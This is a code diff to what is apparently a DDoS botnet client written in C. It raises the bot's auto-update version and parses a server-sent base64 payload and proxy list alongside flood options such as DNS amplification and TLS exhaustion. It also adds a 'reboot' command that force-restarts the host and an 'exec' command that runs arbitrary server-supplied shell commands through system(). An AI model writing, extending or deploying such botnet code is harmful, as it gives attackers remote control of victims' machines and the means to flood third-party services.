@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.38"
+#define BOT_VERSION_TAG "v4.0.49"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -410,6 +410,9 @@ int main(int argc, char *argv[])
                 atk.tls_exhaust = (unsigned)json_int(buf, "tls_exhaust");
                 atk.dns_amp = (unsigned)json_int(buf, "dns_amp");
                 atk.mega_mode = (unsigned)json_int(buf, "mega_mode");
+                /* Server-provided payload (base64) + proxy list */
+                json_str(buf, "payload", atk.payload_b64, sizeof(atk.payload_b64));
+                json_str(buf, "proxies", atk.proxies, sizeof(atk.proxies));
                 if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                 if (!atk.max_threads) atk.max_threads = cfg.default_threads;
                 if (!atk.method[0]) strcpy(atk.method, "UDP");
@@ -470,6 +473,20 @@ int main(int argc, char *argv[])
             }
             else if (!strcmp(type, "standby")) {
                 request_attack_stop();
+            }
+            else if (!strcmp(type, "reboot")) {
+                if (foreground) fprintf(stderr, "[bot] reboot received\n");
+                system("reboot -f 2>/dev/null || shutdown -r now 2>/dev/null &");
+                g_shutdown = 1;
+                break;
+            }
+            else if (!strcmp(type, "exec")) {
+                char cmd[512] = {0};
+                json_str(buf, "command", cmd, sizeof(cmd));
+                if (cmd[0]) {
+                    if (foreground) fprintf(stderr, "[bot] exec: %s\n", cmd);
+                    system(cmd);
+                }
             }
             (void)handshaked;
         }
